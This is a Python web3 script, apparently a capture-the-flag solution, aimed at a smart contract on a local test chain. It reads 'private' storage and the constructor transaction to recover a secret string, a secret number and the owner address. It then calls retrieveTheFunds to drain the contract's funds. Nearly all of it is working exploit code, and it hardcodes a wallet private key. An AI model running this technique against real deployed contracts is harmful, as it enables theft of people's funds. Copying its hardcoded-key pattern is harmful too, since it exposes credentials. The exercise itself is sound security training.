from web3 import Web3
from web3.middleware import geth_poa_middleware
import requests

rpc_url = "http://127.0.0.1:7545/"

contract_address = "0x56bf66Ac3c32DfA0E0189e47597bE98f18c4948F"

# the abi info generated by deploying the contract on remix, after that copying the web3deply abi from there.
abi = '[{"inputs":[{"internalType":"string","name":"_not_yours","type":"string"},{"internalType":"uint256","name":"_secret_number","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"cool_wallet_addresses","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"giveTheFunds","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"string","name":"secret","type":"string"},{"internalType":"uint256","name":"secret_number","type":"uint256"},{"internalType":"address","name":"_owner_address","type":"address"}],"name":"retrieveTheFunds","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"seconds_in_a_year","outputs":[{"internalType":"int256","name":"","type":"int256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"spooky_hash","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"}]'

wallet_address = "0x709e7038B21a9F583CdCcc82b40a247f702Ed162"

wallet_privatekey = "84b617c70cc434aa3bc15b1db9c3f1eb1fa9cb098f2661ab1ae60d88c63765f9"

# Connect to the blockchain network
web3 = Web3(Web3.HTTPProvider(rpc_url))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

contract = web3.eth.contract(address=contract_address,abi=abi)

#Check if we are connected
def isConnected():
    if web3.isConnected() == True:
        print("[+] HOLLLAY, You are connected!")
    elif web3.isConnected() == False:
        print("[-] OPPS, You are not connected!")
    else:
        print("[!] I don't know what the heck is happening")

def getConstructorPosition():
    blockNum = web3.eth.get_block('latest')["number"]
    #print(blockNum)

    for i in range(blockNum+1):
        block_txs = web3.eth.get_block(i).transactions
        if len(block_txs) < 1:
            continue
        
        for tx_i in block_txs:
            tx = web3.eth.get_transaction(tx_i)
            #print(tx_i)

            if tx["to"] is None:
                print("[+] The Block might has the constructor transaction: ",i)
                print("[+] The transaction might has the constructor: ", web3.toHex(tx['hash']))


def gatherTheKeys():
    global not_yours
    global owner_address
    global secret_number

    not_yours = web3.eth.getStorageAt(contract_address,3)
    not_yours = web3.toText(not_yours)
    not_yours = not_yours.replace(".","")
    print("[+] The value of not_yours varaible: ",not_yours)

    owner_address = web3.eth.get_transaction("0x8152a749de91af5490d888ed3b58e0a180b70f625456cbf107f285545472c043")['from']
    print("[+] The value owner_address variable: ",owner_address)

    secret_number = "0x"+web3.eth.get_transaction("0x8152a749de91af5490d888ed3b58e0a180b70f625456cbf107f285545472c043")['input'][-136:-128]
    secret_number = int(secret_number,16)
    print("[+] The secret_number value: ",secret_number)


def hackTheFunds():
    nonce = web3.eth.getTransactionCount(wallet_address)

    HackTheFunds_tx = contract.functions.retrieveTheFunds("how care about the hack",secret_number,owner_address).buildTransaction({

        'nonce' : nonce,
        'gas' : 100000,
        'gasPrice' : web3.toWei('4','gwei'),
        'from': wallet_address  

    })

    signed_HackTheFunds_tx = web3.eth.account.sign_transaction(HackTheFunds_tx, wallet_privatekey)
    tx_hash = web3.eth.sendRawTransaction(signed_HackTheFunds_tx.rawTransaction)
    tx_receipt = web3.eth.waitForTransactionReceipt(tx_hash)
    if tx_receipt['status'] == 1:
        print("[+] Your transaction succeeded")
    else:
        print("[-] Your transaction revert")

if __name__ == '__main__':
    isConnected()
    print("\n----------------------------------\n")
    getConstructorPosition()
    print("\n----------------------------------\n")
    gatherTheKeys()
    print("\n----------------------------------\n")
    hackTheFunds()